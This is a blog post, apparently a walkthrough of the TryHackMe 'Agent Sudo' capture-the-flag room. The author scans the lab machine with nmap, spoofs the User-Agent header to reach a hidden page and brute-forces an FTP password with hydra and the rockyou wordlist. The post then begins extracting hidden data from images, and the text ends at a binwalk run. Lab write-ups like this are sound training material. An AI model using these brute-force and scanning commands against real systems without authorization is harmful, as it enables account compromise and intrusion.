<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="map[name:Rob]">
<meta name="description" content="Walkthrough write-up of the TryHackMe AgentSudo CTF" />
<meta name="keywords" content="cybersecurity, hacking, tryhackme, blog, blog, tryhackme, gobuster, nmap, hydra, binwalk, johntheripper, stegcracker, steghide" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://robscharf.github.io/posts/2022/05/thm-agent-sudo--write-up/" />

    <title>
        robscharf@github
    </title>


<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://robscharf.github.io/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="https://robscharf.github.io/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://robscharf.github.io/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://robscharf.github.io/favicon-16x16.png">
    <link rel="manifest" href="https://robscharf.github.io/site.webmanifest">
    <link rel="mask-icon" href="https://robscharf.github.io/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="https://robscharf.github.io/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="THM: Agent Sudo -- Write-Up">
<meta itemprop="description" content="Walkthrough write-up of the TryHackMe AgentSudo CTF"><meta itemprop="datePublished" content="2022-05-23T14:14:00+00:00" />
<meta itemprop="dateModified" content="2022-05-23T14:14:00+00:00" />
<meta itemprop="wordCount" content="2463"><meta itemprop="image" content="https://robscharf.github.io/"/>
<meta itemprop="keywords" content="blog,tryhackme,gobuster,nmap,hydra,binwalk,johntheripper,stegcracker,steghide," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://robscharf.github.io/"/>

<meta name="twitter:title" content="THM: Agent Sudo -- Write-Up"/>
<meta name="twitter:description" content="Walkthrough write-up of the TryHackMe AgentSudo CTF"/>




    <meta property="og:title" content="THM: Agent Sudo -- Write-Up" />
<meta property="og:description" content="Walkthrough write-up of the TryHackMe AgentSudo CTF" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://robscharf.github.io/posts/2022/05/thm-agent-sudo--write-up/" /><meta property="og:image" content="https://robscharf.github.io/"/><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-05-23T14:14:00+00:00" />
<meta property="article:modified_time" content="2022-05-23T14:14:00+00:00" />





    <meta property="article:section" content="ctf" />

    <meta property="article:section" content="TryHackMe" />



    <meta property="article:published_time" content="2022-05-23 14:14:00 &#43;0000 UTC" />






<link rel="stylesheet" href='https://robscharf.github.io/style.css'>



    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://robscharf.github.io/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text">(virtualtack@github)-[~] $ </span>
            <span class="logo__cursor" style=
                  "
                   background-color:#6495ed;
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://robscharf.github.io/about/">about</a></li><li><a href="https://robscharf.github.io/posts/">posts</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        12 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://robscharf.github.io/posts/2022/05/thm-agent-sudo--write-up/">THM: Agent Sudo &ndash; Write-Up</a>
      </h1>

      
        <div class="post-excerpt">Walkthrough write-up of the TryHackMe AgentSudo CTF</div>
      

      

      

      <div class="post-content">
        <h2 id="about">About</h2>
<p><a href="https://tryhackme.com/">TryHackMe.com</a>&rsquo;s <a href="https://tryhackme.com/room/agentsudoctf">Agent Sudo</a> is a beginner-friendly capture-the-flag virtual machine by <a href="https://tryhackme.com/p/DesKel">DesKel</a>. Agent Sudo has a secret agent theme and challenges users to capture two flags and gain root access by locating and decrypting a series of confidential communications.</p>
<h3 id="note">Note</h3>
<p>I have replaced all instances of the virtual machine&rsquo;s ip address with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
<h2 id="methodology">Methodology</h2>
<p>We begin our enumeration efforts by running an <code>nmap</code> scan on the target machine to understand the ports that are open to network traffic. I start with the <code>-V</code>, <code>-C</code>, and <code>-T4</code> flags.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># Nmap 7.92 scan initiated Mon May 23 09:23:53 2022 as: nmap -sVC -T4 -o initial-svc-nmap.out 10.10.166.253</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.166.253
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.13s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">997</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">21/tcp open  ftp     vsftpd 3.0.3
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Annoucement
</span></span><span class="line"><span class="cl">Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Mon May 23 09:24:05 2022 -- 1 IP address (1 host up) scanned in 12.65 seconds</span>
</span></span></code></pre></div><p>Now we know that the target is running <code>vsftpd 3.0.3</code> on <code>port 21</code>, <code>OpenSSH 7.6p1</code> on <code>port 22</code>, and an <code>Apache httpd 2.4.29</code> web server on <code>port 80</code> with the <code>http-title</code> of <code>announcement</code> - all open to <code>tcp</code> traffic.</p>
<p>Next, we visit the web server in a web browser.</p>
<p><code>/index.html</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DocType html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Annoucement<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Dear agents,
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Use your own <span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span>codename<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;</span> as user-agent to access the site.
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	From,<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Agent R
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>We&rsquo;re greeted with a message from Agent R, instructing other agents to change their <code>user-agent</code> to thier codename for site access. Here I used <a href="https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/">User-Agent Switcher</a> to alter my requests. I began by trying to log in as the boss, chaning my user agent to &ldquo;R&rdquo;. Unfortunately, we&rsquo;re given a hostile response by the administrator (presumably R himself) for this request:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>   
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>What are you doing! Are you one of the 25 employees? If not, I going to report this incident
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Annoucement<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Dear agents,
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Use your own <span class="p">&lt;</span><span class="nt">b</span><span class="p">&gt;</span>codename<span class="p">&lt;/</span><span class="nt">b</span><span class="p">&gt;</span> as user-agent to access the site.
</span></span><span class="line"><span class="cl">	<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	From,<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">	Agent R
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Likewise, user-agents <code>A</code> and <code>B</code> do not work, but <code>C</code> redirects us to <code>/agent_C_attention.php</code> on the web site:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">Attention ----s, <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">From,<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">Agent R
</span></span></code></pre></div><p>Out of curiosity, I tried <code>J</code> as a user-agent, but that did not yield anything. However, now that we know about a user named <code>----s</code>, we should see if we can access the vsftpd FTP server on port 21. I chose to use <code>hydra</code> to attempt to brute force the server. This process went extremely slowly, unfortunately, with several disconnections from the remote host. I assume that this has to do with some form of rate limiting.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ hydra -t <span class="m">1</span> -l ----s -P /usr/share/wordlists/rockyou.txt -vV 10.10.73.189 ftp
</span></span><span class="line"><span class="cl">Hydra v9.3 <span class="o">(</span>c<span class="o">)</span> <span class="m">2022</span> by van Hauser/THC <span class="p">&amp;</span> David Maciejak - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes <span class="o">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> starting at 2022-05-23 10:19:49
</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">1</span> task per <span class="m">1</span> server, overall <span class="m">1</span> task, <span class="m">14344399</span> login tries <span class="o">(</span>l:1/p:14344399<span class="o">)</span>, ~14344399 tries per task
</span></span><span class="line"><span class="cl"><span class="o">[</span>DATA<span class="o">]</span> attacking ftp://10.10.73.189:21/
</span></span><span class="line"><span class="cl"><span class="o">[</span>VERBOSE<span class="o">]</span> Resolving addresses ... <span class="o">[</span>VERBOSE<span class="o">]</span> resolving <span class="k">done</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;123456&#34;</span> - <span class="m">1</span> of <span class="m">14344399</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;12345&#34;</span> - <span class="m">2</span> of <span class="m">14344400</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/1<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 2.00 tries/min, <span class="m">2</span> tries in 00:01h, <span class="m">14344398</span> to <span class="k">do</span> in 119536:40h, <span class="m">1</span> active
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;123456789&#34;</span> - <span class="m">3</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;password&#34;</span> - <span class="m">4</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;iloveyou&#34;</span> - <span class="m">5</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;princess&#34;</span> - <span class="m">6</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;1234567&#34;</span> - <span class="m">7</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">... 🕒 two hours later 🕒 ...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;cutie&#34;</span> - <span class="m">243</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;james&#34;</span> - <span class="m">244</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;banana&#34;</span> - <span class="m">245</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;prince&#34;</span> - <span class="m">246</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> 7.94 tries/min, <span class="m">246</span> tries in 00:31h, <span class="m">14344155</span> to <span class="k">do</span> in 30126:37h, <span class="m">1</span> active
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;friend&#34;</span> - <span class="m">247</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;jesus1&#34;</span> - <span class="m">248</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>ATTEMPT<span class="o">]</span> target 10.10.73.189 - login <span class="s2">&#34;----s&#34;</span> - pass <span class="s2">&#34;------l&#34;</span> - <span class="m">249</span> of <span class="m">14344401</span> <span class="o">[</span>child 0<span class="o">]</span> <span class="o">(</span>0/2<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>21<span class="o">][</span>ftp<span class="o">]</span> host: 10.10.73.189   login: ----s   password: ------l
</span></span><span class="line"><span class="cl"><span class="o">[</span>STATUS<span class="o">]</span> attack finished <span class="k">for</span> 10.10.73.189 <span class="o">(</span>waiting <span class="k">for</span> children to <span class="nb">complete</span> tests<span class="o">)</span>
</span></span></code></pre></div><p>We test out our new credentials and discover three files on the FTP server that we can get. We download the text message first.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ftp 10.10.73.189 
</span></span><span class="line"><span class="cl">Connected to 10.10.73.189.
</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.10.73.189:virtualtack<span class="o">)</span>: ----s
</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
</span></span><span class="line"><span class="cl">ftp&gt; ls
</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>20720<span class="p">|</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>             <span class="m">217</span> Oct <span class="m">29</span>  <span class="m">2019</span> To_agentJ.txt
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>           <span class="m">33143</span> Oct <span class="m">29</span>  <span class="m">2019</span> cute-alien.jpg
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>           <span class="m">34842</span> Oct <span class="m">29</span>  <span class="m">2019</span> cutie.png
</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
</span></span><span class="line"><span class="cl">ftp&gt; get To_agentJ.txt
</span></span><span class="line"><span class="cl">local: To_agentJ.txt remote: To_agentJ.txt
</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>35196<span class="p">|</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> To_agentJ.txt <span class="o">(</span><span class="m">217</span> bytes<span class="o">)</span>.
</span></span><span class="line"><span class="cl">100% <span class="p">|</span>************<span class="p">|</span>   <span class="m">217</span>       75.79 KiB/s    00:00 ETA
</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
</span></span><span class="line"><span class="cl"><span class="m">217</span> bytes received in 00:00 <span class="o">(</span>1.69 KiB/s<span class="o">)</span>
</span></span><span class="line"><span class="cl">ftp&gt; <span class="nb">exit</span>
</span></span><span class="line"><span class="cl"><span class="m">221</span> Goodbye.                                                    
</span></span></code></pre></div><p><code>To_agentJ.txt</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Dear agent J,
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn<span class="err">&#39;</span>t be a problem <span class="k">for</span> you.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">From,
</span></span><span class="line"><span class="cl">Agent C
</span></span></code></pre></div><p>Good to know! Let&rsquo;s grab the image files and figure out how to extract Agent J&rsquo;s login password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ ftp 10.10.73.189 
</span></span><span class="line"><span class="cl">Connected to 10.10.73.189.
</span></span><span class="line"><span class="cl"><span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
</span></span><span class="line"><span class="cl">Name <span class="o">(</span>10.10.73.189:virtualtack<span class="o">)</span>: ----s
</span></span><span class="line"><span class="cl"><span class="m">331</span> Please specify the password.
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl"><span class="m">230</span> Login successful.
</span></span><span class="line"><span class="cl">Remote system <span class="nb">type</span> is UNIX.
</span></span><span class="line"><span class="cl">Using binary mode to transfer files.
</span></span><span class="line"><span class="cl">ftp&gt; ls
</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>27749<span class="p">|</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">150</span> Here comes the directory listing.
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>             <span class="m">217</span> Oct <span class="m">29</span>  <span class="m">2019</span> To_agentJ.txt
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>           <span class="m">33143</span> Oct <span class="m">29</span>  <span class="m">2019</span> cute-alien.jpg
</span></span><span class="line"><span class="cl">-rw-r--r--    <span class="m">1</span> <span class="m">0</span>        <span class="m">0</span>           <span class="m">34842</span> Oct <span class="m">29</span>  <span class="m">2019</span> cutie.png
</span></span><span class="line"><span class="cl"><span class="m">226</span> Directory send OK.
</span></span><span class="line"><span class="cl">ftp&gt; get cute-alien.jpg
</span></span><span class="line"><span class="cl">local: cute-alien.jpg remote: cute-alien.jpg
</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>13011<span class="p">|</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> cute-alien.jpg <span class="o">(</span><span class="m">33143</span> bytes<span class="o">)</span>.
</span></span><span class="line"><span class="cl">100% <span class="p">|</span>************<span class="p">|</span> <span class="m">33143</span>      308.57 KiB/s    00:00 ETA
</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
</span></span><span class="line"><span class="cl"><span class="m">33143</span> bytes received in 00:00 <span class="o">(</span>154.69 KiB/s<span class="o">)</span>
</span></span><span class="line"><span class="cl">ftp&gt; get cutie.png
</span></span><span class="line"><span class="cl">local: cutie.png remote: cutie.png
</span></span><span class="line"><span class="cl"><span class="m">229</span> Entering Extended Passive Mode <span class="o">(||</span><span class="p">|</span>63920<span class="p">|</span><span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> cutie.png <span class="o">(</span><span class="m">34842</span> bytes<span class="o">)</span>.
</span></span><span class="line"><span class="cl">100% <span class="p">|</span>************<span class="p">|</span> <span class="m">34842</span>      322.63 KiB/s    00:00 ETA
</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
</span></span><span class="line"><span class="cl"><span class="m">34842</span> bytes received in 00:00 <span class="o">(</span>158.37 KiB/s<span class="o">)</span>
</span></span><span class="line"><span class="cl">ftp&gt; quit
</span></span><span class="line"><span class="cl"><span class="m">221</span> Goodbye.
</span></span></code></pre></div><p>I should have used <code>mget *</code> here instead. Looking at the two images, I don&rsquo;t see anything immediately interesting. They are cute, though.</p>
<p>I spent a while viewing the files but don&rsquo;t get anywhere. So I consult the internet. Turns out the clever agents hid a text string inside a data file <a href="https://www.howtogeek.com/427805/how-to-use-the-strings-command-on-linux/">you can do this with binaries, too</a>. Apparently everyone on the internet uses <code>binwalk</code> for this scenario. <a href="https://www.kali.org/tools/binwalk/">Binwalk</a> is a tool for searching a given binary image for embedded files and executable code. Specifically, it is designed for identifying files and code embedded inside of firmware images. They must teach this stuff at spy school.</p>
<p>Let&rsquo;s binwalk&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>virtualtack㉿kali-bot<span class="o">)</span>-<span class="o">[</span>~/thm/agent-sudo<span class="o">]</span>
</span></span><span class="line"><span class="cl">└─$ binwalk cutie.png
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DECIMAL       HEXADECIMAL     DESCRIPTION
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl"><span class="m">0</span>             0x0             PNG image, <span class="m">528</span> x 528, 8-bit colormap, non-interlaced
</span></span><span class="line"><span class="cl"><span class="m">869</span>           0x365           Zlib compressed data, best compression
